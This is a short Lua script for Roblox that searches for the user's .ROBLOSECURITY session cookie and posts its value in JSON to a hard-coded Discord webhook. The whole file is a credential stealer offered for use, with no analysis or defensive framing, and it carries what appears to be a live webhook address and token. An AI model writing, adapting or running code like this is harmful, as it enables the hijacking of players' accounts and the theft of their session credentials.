local http = game:GetService("HttpService")

-- Function to get the ROBLOSECURITY cookie
local function getRoblosecurityCookie()
    local cookies = http:GetCookies("https://www.roblox.com")
    for _, cookie in pairs(cookies) do
        if cookie.Name == ".ROBLOSECURITY" then
            return cookie.Value
        end
    end
    return nil
end

-- Function to send data to a webhook
local function sendToWebhook(data)
    local webhookUrl = "https://discord.com/api/webhooks/1259850226622267495/3KS_DZ7T5RUQvfCcQ5_0Yp8kZ-l69vkasJ1z_WKjZcqmSLHom2t0h2QeJUr2c-_jvxpW"
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local requestData = http:JSONEncode(data)
    
    local success, response = pcall(function()
        return http:PostAsync(webhookUrl, requestData, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
    
    if success then
        print("Data sent to webhook successfully")
    else
        warn("Failed to send data to webhook: " .. tostring(response))
    end
end

-- Get the ROBLOSECURITY cookie and send it to the webhook
local roblosecurityCookie = getRoblosecurityCookie()
if roblosecurityCookie then
    local exampleData = {
        roblosecurity = roblosecurityCookie
    }
    sendToWebhook(exampleData)
else
    print("ROBLOSECURITY cookie not found")
end
